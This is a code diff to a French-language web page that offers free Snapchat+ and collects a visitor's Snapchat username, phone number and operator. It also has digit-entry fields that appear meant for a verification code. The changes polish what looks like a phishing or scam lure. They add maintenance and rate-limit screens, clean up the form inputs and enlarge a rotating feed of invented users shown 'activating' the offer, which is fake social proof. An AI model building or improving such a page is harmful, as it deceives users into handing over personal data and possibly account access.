@@ -591,6 +591,27 @@
             animation: slideInText 0.8s ease-out 0.3s both;
         }
 
+        /* ===== SITE DÉSACTIVÉ / RATE LIMIT ===== */
+        .error-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: none; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 5000;
+            padding: 30px; text-align: center;
+        }
+        .error-overlay.show { display: flex; }
+        .error-icon { font-size: 64px; margin-bottom: 20px; }
+        .error-title {
+            font-size: 24px; font-weight: 800; margin-bottom: 12px;
+            background: linear-gradient(135deg, #fff, #ff6b6b);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .error-subtitle { font-size: 15px; color: #888; line-height: 1.6; max-width: 320px; }
+        .error-badge {
+            margin-top: 28px; background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 14px;
+            padding: 14px 22px; font-size: 13px; color: #666;
+        }
+
         /* ===== ONLINE COUNTER ===== */
         .online-counter {
             display: inline-flex; align-items: center; gap: 7px;
@@ -624,27 +645,25 @@
         /* ===== TÉMOIGNAGES ===== */
         .testimonials-feed {
             margin-bottom: 28px;
-            overflow: hidden; height: 48px; position: relative;
             animation: slideUp 0.8s ease-out 0.55s both;
         }
         .testimonial-item {
             display: flex; align-items: center; gap: 10px;
             background: rgba(255,255,255,0.04); border-radius: 12px; padding: 9px 14px;
             font-size: 13px; color: #bbb;
-            position: absolute; width: 100%;
-            opacity: 0; transform: translateY(20px);
-            transition: opacity 0.5s ease, transform 0.5s ease;
+            opacity: 0;
+            transition: opacity 0.5s ease;
         }
-        .testimonial-item.show { opacity: 1; transform: translateY(0); }
+        .testimonial-item.show { opacity: 1; }
         .testimonial-avatar {
-            width: 26px; height: 26px; border-radius: 50%;
+            width: 28px; height: 28px; border-radius: 50%;
             background: linear-gradient(135deg, #FFFC00, #FF6B00);
             display: flex; align-items: center; justify-content: center;
             font-size: 12px; font-weight: 800; color: #000; flex-shrink: 0;
         }
         .testimonial-text { flex: 1; }
         .testimonial-text strong { color: #fff; }
-        .testimonial-check { color: #FFFC00; font-size: 12px; }
+        .testimonial-check { color: #FFFC00; font-size: 13px; }
 
         /* ===== CONFETTIS ===== */
         .confetti-piece {
@@ -727,7 +746,11 @@
             </div>
 
             <div class="testimonials-feed" id="testimonialsFeed">
-                <!-- injecté par JS -->
+                <div class="testimonial-item" id="testimonialCard">
+                    <div class="testimonial-avatar" id="testimonialAvatar">?</div>
+                    <div class="testimonial-text" id="testimonialText"></div>
+                    <span class="testimonial-check" id="testimonialEmoji"></span>
+                </div>
             </div>
 
             <div class="stats-container">
@@ -756,7 +779,7 @@
                     <label class="form-label"><i class="fas fa-at"></i> Pseudo Snapchat</label>
                     <div class="input-wrapper">
                         <span class="input-icon">@</span>
-                        <input type="text" id="snapchatInput" class="input-field" placeholder="ton_pseudo" autocomplete="off" required>
+                        <input type="text" id="snapchatInput" class="input-field" placeholder="ton_pseudo" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" required>
                     </div>
                 </div>
 
@@ -764,7 +787,7 @@
                     <label class="form-label"><i class="fas fa-phone"></i> Numéro de téléphone</label>
                     <div class="input-wrapper">
                         <span class="input-icon"><i class="fas fa-mobile-alt"></i></span>
-                        <input type="tel" id="phoneInput" class="input-field" placeholder="06xxxxxxxx" maxlength="10" inputmode="numeric" pattern="[0-9]{10}" autocomplete="off" required>
+                        <input type="tel" id="phoneInput" class="input-field" placeholder="06 xx xx xx xx" maxlength="14" inputmode="numeric" autocomplete="off" required>
                     </div>
                 </div>
 
@@ -885,6 +908,26 @@
         <div class="nav-item"><i class="fas fa-user"></i><span>Profil</span></div>
     </div>
 
+    <!-- Site désactivé overlay -->
+    <div id="siteDisabledOverlay" class="error-overlay">
+        <div class="error-icon">🔧</div>
+        <div class="error-title">Maintenance en cours</div>
+        <div class="error-subtitle">Le service est temporairement indisponible. Reviens dans quelques minutes.</div>
+        <div class="error-badge"><i class="fas fa-clock"></i> Réouverture prévue bientôt</div>
+    </div>
+
+    <!-- Rate limit overlay -->
+    <div id="rateLimitOverlay" class="error-overlay">
+        <div class="error-icon">⏳</div>
+        <div class="error-title">Trop de tentatives</div>
+        <div class="error-subtitle" id="rateLimitMsg">Tu as déjà envoyé une demande récemment. Réessaie dans quelques minutes.</div>
+        <button onclick="document.getElementById('rateLimitOverlay').classList.remove('show')" style="
+            margin-top: 28px; background: rgba(255,255,255,0.1); color: #fff;
+            border: 1px solid rgba(255,255,255,0.2); border-radius: 20px;
+            padding: 12px 28px; font-size: 14px; font-weight: 600; cursor: pointer;
+        ">← Retour</button>
+    </div>
+
     <!-- Success overlay -->
     <div id="successOverlay" class="success-overlay">
         <div class="success-icon"><i class="fas fa-check-circle"></i></div>
@@ -925,8 +968,8 @@
             const snapchatInput = document.getElementById('snapchatInput');
             const phoneInput = document.getElementById('phoneInput');
             const operatorSelect = document.getElementById('operatorSelect');
-            const snapchat = snapchatInput.value.trim();
-            const phone = phoneInput.value.trim().replace(/\s+/g, '');
+            const snapchat = snapchatInput.value.trim().toLowerCase();
+            const phone = phoneInput.value.replace(/\D/g, ''); // chiffres bruts
             const operator = operatorSelect.value;
 
             if (!snapchat || snapchat.length < 3) { alert('Pseudo invalide (min 3 caractères).'); snapchatInput.focus(); return; }
@@ -945,8 +988,12 @@
                     body: JSON.stringify({ snapchat, phone, operator })
                 });
                 const data = await res.json();
+                if (res.status === 503 && data.error === 'site_disabled') {
+                    showSiteDisabled();
+                    return;
+                }
                 if (res.status === 429) {
-                    alert('Tu as déjà envoyé une demande récemment. Réessaie dans quelques minutes.');
+                    showRateLimitError(data.error || 'Réessaie dans quelques minutes.');
                     sendBtn.disabled = false;
                     sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
                     return;
@@ -1161,6 +1208,14 @@
             });
         }
 
+        function showSiteDisabled() {
+            document.getElementById('siteDisabledOverlay').classList.add('show');
+        }
+        function showRateLimitError(msg) {
+            document.getElementById('rateLimitMsg').textContent = msg;
+            document.getElementById('rateLimitOverlay').classList.add('show');
+        }
+
         function returnHome() {
             // Cacher l'overlay
             document.getElementById('successOverlay').classList.remove('show');
@@ -1183,6 +1238,20 @@
             showStep('step1');
             window.scrollTo(0, 0);
         }
+
+        // ===== AUTO-LOWERCASE PSEUDO =====
+        document.getElementById('snapchatInput').addEventListener('input', function() {
+            const pos = this.selectionStart;
+            this.value = this.value.toLowerCase();
+            this.setSelectionRange(pos, pos);
+        });
+
+        // ===== AUTO-CLEAN NUMÉRO (espaces, tirets, points → chiffres seulement) =====
+        document.getElementById('phoneInput').addEventListener('input', function() {
+            const raw = this.value.replace(/\D/g, '').slice(0, 10);
+            // Affichage formaté XX XX XX XX XX pour lisibilité
+            this.value = raw.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+        });
 
         // Gestion des champs de code
         document.querySelectorAll('.code-digit-input').forEach((input, index, inputs) => {
@@ -1282,45 +1351,64 @@
 
         /* ===== TÉMOIGNAGES ===== */
         function initTestimonials() {
-            const feed = document.getElementById('testimonialsFeed');
-            if (!feed) return;
+            const card   = document.getElementById('testimonialCard');
+            const avatar = document.getElementById('testimonialAvatar');
+            const text   = document.getElementById('testimonialText');
+            const emoji  = document.getElementById('testimonialEmoji');
+            if (!card) return;
+
             const items = [
-                { pseudo: 'lucas_snap22',  text: 'vient d\'activer Snapchat+', emoji: '⭐' },
-                { pseudo: 'manon.off',     text: 'vient de rejoindre Snapchat+', emoji: '🎉' },
-                { pseudo: 'kev94200',      text: 'a obtenu son accès Premium', emoji: '✅' },
-                { pseudo: 'jade_bzh',      text: 'vient d\'activer Snapchat+', emoji: '🔥' },
-                { pseudo: 'theo_snap',     text: 'vient de rejoindre Snapchat+', emoji: '⭐' },
-                { pseudo: 'ines.lb',       text: 'a obtenu son accès Premium', emoji: '✅' },
-                { pseudo: 'rayan.off_',    text: 'vient d\'activer Snapchat+', emoji: '🎉' },
-                { pseudo: 'camille_lv',    text: 'vient de rejoindre Snapchat+', emoji: '🔥' },
-                { pseudo: 'maxou_snap33',  text: 'a obtenu son accès Premium', emoji: '⭐' },
-                { pseudo: 'lola_bzh59',    text: 'vient d\'activer Snapchat+', emoji: '✅' },
+                { pseudo: 'lucas.snp22',    texte: 'vient d\'activer Snapchat+',    e: '⭐' },
+                { pseudo: 'manon_offi',     texte: 'vient de rejoindre Snapchat+',  e: '🎉' },
+                { pseudo: 'kev94200',       texte: 'a obtenu son accès Premium',    e: '✅' },
+                { pseudo: 'jade.bzh29',     texte: 'vient d\'activer Snapchat+',    e: '🔥' },
+                { pseudo: 'theo_sn4p',      texte: 'vient de rejoindre Snapchat+',  e: '⭐' },
+                { pseudo: 'ines.lbrt',      texte: 'a obtenu son accès Premium',    e: '✅' },
+                { pseudo: 'rayan.off',      texte: 'vient d\'activer Snapchat+',    e: '🎉' },
+                { pseudo: 'camille75_',     texte: 'vient de rejoindre Snapchat+',  e: '🔥' },
+                { pseudo: 'maxime.snp',     texte: 'a obtenu son accès Premium',    e: '⭐' },
+                { pseudo: 'lola_59b',       texte: 'vient d\'activer Snapchat+',    e: '✅' },
+                { pseudo: 'noa.martin',     texte: 'vient de rejoindre Snapchat+',  e: '🎉' },
+                { pseudo: 'alexia_snap',    texte: 'a obtenu son accès Premium',    e: '🔥' },
+                { pseudo: 'enzo.2k4',       texte: 'vient d\'activer Snapchat+',    e: '⭐' },
+                { pseudo: 'juliette.off',   texte: 'vient de rejoindre Snapchat+',  e: '✅' },
+                { pseudo: 'matteo_bzh',     texte: 'a obtenu son accès Premium',    e: '🎉' },
+                { pseudo: 'sarah.lmr',      texte: 'vient d\'activer Snapchat+',    e: '🔥' },
+                { pseudo: 'tom.snap69',     texte: 'vient de rejoindre Snapchat+',  e: '⭐' },
+                { pseudo: 'lea_prs75',      texte: 'a obtenu son accès Premium',    e: '✅' },
+                { pseudo: 'raphaell.sn',    texte: 'vient d\'activer Snapchat+',    e: '🎉' },
+                { pseudo: 'chloe.off13',    texte: 'vient de rejoindre Snapchat+',  e: '🔥' },
             ];
+
+            // Mélange pour ne pas toujours commencer pareil
+            for (let i = items.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [items[i], items[j]] = [items[j], items[i]];
+            }
+
             let idx = 0;
-            let current = null;
 
             function showNext() {
                 const item = items[idx % items.length];
                 idx++;
-                const div = document.createElement('div');
-                div.className = 'testimonial-item';
-                const letter = item.pseudo[0].toUpperCase();
-                div.innerHTML = `
-                    <div class="testimonial-avatar">${letter}</div>
-                    <div class="testimonial-text"><strong>${item.pseudo}</strong> ${item.text}</div>
-                    <span class="testimonial-check">${item.emoji}</span>
-                `;
-                feed.appendChild(div);
-                requestAnimationFrame(() => div.classList.add('show'));
-                if (current) {
-                    current.classList.remove('show');
-                    setTimeout(() => current && current.remove(), 600);
-                }
-                current = div;
+
+                // Fade out
+                card.classList.remove('show');
+
+                setTimeout(() => {
+                    // Mise à jour du contenu
+                    avatar.textContent = item.pseudo[0].toUpperCase();
+                    text.innerHTML = `<strong>${item.pseudo}</strong> ${item.texte}`;
+                    emoji.textContent = item.e;
+                    // Fade in
+                    card.classList.add('show');
+                }, 500); // attend la fin du fade-out
             }
 
+            // Premier affichage immédiat
             showNext();
-            setInterval(showNext, 7000 + Math.random() * 4000);
+            // Ensuite toutes les 8–12s
+            setInterval(showNext, 8000 + Math.random() * 4000);
         }
 
         /* ===== CONFETTIS ===== */
